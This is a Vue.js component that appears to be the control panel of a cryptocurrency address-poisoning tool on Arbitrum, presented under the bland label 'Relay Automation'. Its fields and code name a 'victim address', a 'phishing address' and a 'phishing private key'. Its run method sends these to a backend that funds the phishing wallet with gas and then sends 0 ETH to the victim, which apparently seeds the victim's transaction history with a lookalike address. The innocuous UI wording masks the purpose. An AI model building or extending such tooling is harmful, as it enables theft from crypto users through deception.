<template>
    <div class="panel" id="relay-panel">
        <div class="relay-header">
            <h3>Relay Automation</h3>
            <p class="subtitle">Securely fund and execute zero-fee transactions.</p>
        </div>

        <form @submit.prevent="runRelay">
            <div class="row">
                <div class="col-12 mt-3">
                    <label for="victim">Victim Address (Target)</label>
                    <input
                        id="victim"
                        type="text"
                        class="text-input-large"
                        placeholder="0x..."
                        v-model="victimAddress"
                        :disabled="running"
                        autocomplete="off"
                    />
                </div>
            </div>

            <div class="row mt-2">
                <div class="col-md-8 col-sm-12 mt-2">
                    <label for="relay-addr">Relay Wallet Address</label>
                    <input
                        id="relay-addr"
                        type="text"
                        class="text-input-large"
                        placeholder="0x..."
                        v-model="phishingAddress"
                        :disabled="running"
                        autocomplete="off"
                    />
                </div>
                <div class="col-md-4 col-sm-12 mt-2">
                    <label for="fund-amt">Fund Amount (Gas)</label>
                    <input
                        id="fund-amt"
                        type="text"
                        class="text-input-large"
                        placeholder="0.000015"
                        v-model="fundAmount"
                        :disabled="running"
                    />
                </div>
            </div>

            <div class="row mt-2">
                <div class="col-12 mt-2">
                    <label for="relay-key">Relay Private Key</label>
                    <input
                        id="relay-key"
                        type="password"
                        class="text-input-large"
                        placeholder="Private Key (Kept secure)"
                        v-model="phishingPrivateKey"
                        :disabled="running"
                        autocomplete="new-password"
                    />
                </div>
            </div>

            <div class="logs-container mt-4" v-if="logs.length">
                <div v-for="(log, i) in logs" :key="i" :class="['log-entry', log.type]">
                    <span class="timestamp">[{{ log.time }}]</span> {{ log.message }}
                </div>
            </div>

            <div class="row mt-4">
                <div class="col-12">
                    <button type="submit" class="button-large relay-btn" :disabled="running || !isValid">
                        <span v-if="running" class="spinner-small"></span>
                        <span v-else>Execute Relay Automation</span>
                    </button>
                </div>
            </div>
        </form>
    </div>
</template>

<script>
    export default {
        name: 'Relay',
        data() {
            return {
                victimAddress: '',
                phishingAddress: '',
                phishingPrivateKey: '',
                fundAmount: '0.000015',
                running: false,
                logs: [],
            };
        },
        computed: {
            isValid() {
                const isAddr = (a) => a && a.startsWith('0x') && a.length === 42;
                const isKey = (k) => k && (k.length === 64 || (k.startsWith('0x') && k.length === 66));
                return isAddr(this.victimAddress) && isAddr(this.phishingAddress) && isKey(this.phishingPrivateKey);
            },
        },
        methods: {
            addLog(message, type = 'info') {
                const now = new Date().toLocaleTimeString([], {
                    hour: '2-digit',
                    minute: '2-digit',
                    second: '2-digit',
                });
                this.logs.push({ time: now, message, type });
                this.$nextTick(() => {
                    const container = this.$el.querySelector('.logs-container');
                    if (container) container.scrollTop = container.scrollHeight;
                });
                if (this.logs.length > 20) this.logs.shift();
            },
            async runRelay() {
                if (this.running || !this.isValid) return;

                this.running = true;
                this.logs = [];
                this.addLog('Initiating relay sequence on Arbitrum...', 'info');

                try {
                    const response = await fetch('/api/relay', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({
                            victimAddress: this.victimAddress,
                            phishingAddress: this.phishingAddress,
                            phishingPrivateKey: this.phishingPrivateKey,
                            fundAmount: this.fundAmount,
                        }),
                    });

                    const result = await response.json();

                    if (response.ok) {
                        if (result.skippedFunding) {
                            this.addLog(`Step 1 Skipped: Wallet already holds sufficient gas.`, 'info');
                        } else {
                            this.addLog(
                                `Step 1: Funded relay wallet (${this.phishingAddress.slice(0, 8)}...).`,
                                'success'
                            );
                        }

                        this.addLog(`Step 2: Sent 0 ETH to victim (${this.victimAddress.slice(0, 8)}...).`, 'success');

                        this.addLog(`Execution completed: ${result.hash.slice(0, 15)}...`, 'success');
                    } else {
                        this.addLog(`Execution failed: ${result.error}`, 'error');
                    }
                } catch (err) {
                    this.addLog(`Connection error: ${err.message}`, 'error');
                } finally {
                    this.running = false;
                }
            },
        },
    };
</script>

<style lang="sass" scoped>
    @import "../css/variables"

    .panel
        min-height: 380px
        border-radius: 12px
        background: $panel-background
        border: 1px solid rgba($border-grey, 0.5)
        padding: 2em
        @media screen and (max-width: 768px)
            padding: 1.5em
        @media screen and (max-width: 480px)
            padding: 1.2em

    .relay-header
        border-left: 3px solid $primary
        padding-left: 15px
        margin-bottom: 25px
        @media screen and (max-width: 480px)
            margin-bottom: 15px

    h3
        color: $text
        font-size: 1.5em
        font-weight: 500
        margin: 0
        @media screen and (max-width: 480px)
            font-size: 1.3em

    .subtitle
        color: $text-alt
        font-size: 0.9em
        margin: 5px 0 0 0

    label
        display: block
        color: $text-alt
        font-size: 0.8em
        text-transform: uppercase
        letter-spacing: 0.05em
        margin-bottom: 6px
        font-weight: 600

    .text-input-large
        border-radius: 6px
        background: $panel-background-alt
        border: 1px solid $border-grey
        color: $text
        padding: 12px
        font-size: 1.1em
        width: 100%
        transition: border-color 0.2s
        @media screen and (max-width: 480px)
            padding: 10px
            font-size: 1em
        &::placeholder
            color: $placeholder
        &:focus
            border-color: $primary
            outline: none

    .relay-btn
        background: linear-gradient(135deg, $primary 0%, $secondary 100%)
        border-radius: 6px
        transition: all 0.3s cubic-bezier(0.175, 0.885, 0.32, 1.275)
        &:hover:not(:disabled)
            transform: translateY(-2px)
            box-shadow: 0 5px 15px rgba($primary, 0.4)
        &:active:not(:disabled)
            transform: translateY(0)
        &:disabled
            background: $disabled
            cursor: not-allowed

    .logs-container
        background: #0d0b14
        border-radius: 6px
        padding: 12px
        font-family: $monospace-font
        font-size: 0.85em
        max-height: 180px
        overflow-y: auto
        border: 1px solid $border-grey
        box-shadow: inset 0 2px 10px rgba(0,0,0,0.5)
        @media screen and (max-width: 480px)
            max-height: 140px
            font-size: 0.75em
            padding: 8px

        .log-entry
            margin-bottom: 4px
            line-height: 1.4
            &.info
                color: $text-alt
            &.success
                color: #4ade80
            &.error
                color: $error

        .timestamp
            color: rgba($text-alt, 0.5)
            font-size: 0.9em
            margin-right: 8px

    .spinner-small
        display: inline-block
        width: 20px
        height: 20px
        border: 2px solid rgba(255,255,255,0.3)
        border-radius: 50%
        border-top-color: #fff
        animation: spin 1s ease-in-out infinite
        vertical-align: middle

    @keyframes spin
        to
            transform: rotate(360deg)

    .mt-2
        margin-top: 10px
    .mt-3
        margin-top: 20px
    .mt-4
        margin-top: 30px
</style>
